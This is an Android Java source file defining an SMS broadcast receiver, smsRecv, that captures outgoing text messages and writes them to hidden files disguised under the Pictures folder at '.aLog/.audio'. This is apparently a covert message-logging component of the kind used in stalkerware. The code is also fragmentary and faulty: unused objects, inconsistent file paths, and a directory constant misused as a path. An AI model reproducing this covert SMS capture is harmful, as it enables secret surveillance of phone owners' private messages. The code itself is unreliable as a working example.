package mdane.myapplication6.Receivers;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.util.ArrayList;

import mdane.myapplication6.SMS.SMSBaseReceiver;
import mdane.myapplication6.util.BetterPrinter;

import static android.content.Context.MODE_PRIVATE;

public class smsRecv extends SMSBaseReceiver {
Context context;
    SharedPreferences prefs;
    Handler aHandle=new Handler();
    private static final String PREFS_NAME = "SMS";


    @Override
   public void onReceive(final Context context, Intent intent) {
        prefs = context.getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.

        if(intent.getAction().equalsIgnoreCase("android.provider.Telephony.SMS_RECEIVED")){
        Bundle bundle = intent.getExtras();
      SMSObj smsObj=  new SMSObj();
            ArrayList aList=new ArrayList();
        BetterPrinter.maketheFile(aList,"SMSREC.txt");

        }}

    @Override
    protected void onSmsReceived(SmsMessage[] messages) {
       Log.i("sent","sent");
        SMSObj smsObj=  new SMSObj();
        ArrayList aList=new ArrayList();}



    @Override
    protected void onSmsSent(SmsMessage[] messages) {
        ArrayList aList=new ArrayList();
        aList.add(messages);
            PrintWriter pw= null;
        File file = new File((Environment.DIRECTORY_PICTURES),
                ".aLog/.audio"+"SMSREC.txt");
        try{

            if(file.exists()){

                pw = new PrintWriter(file);
                pw.append(aList.toString());
                pw.close();}
//Do something
            else{file = new File((Environment.DIRECTORY_PICTURES),
                    ".aLog/.audio/"+"aSMSREC.txt");
                pw = new PrintWriter(file);
                pw.write(aList.toString());
                pw.close();}
        } catch (FileNotFoundException e1) {
            e1.printStackTrace();
        }}}





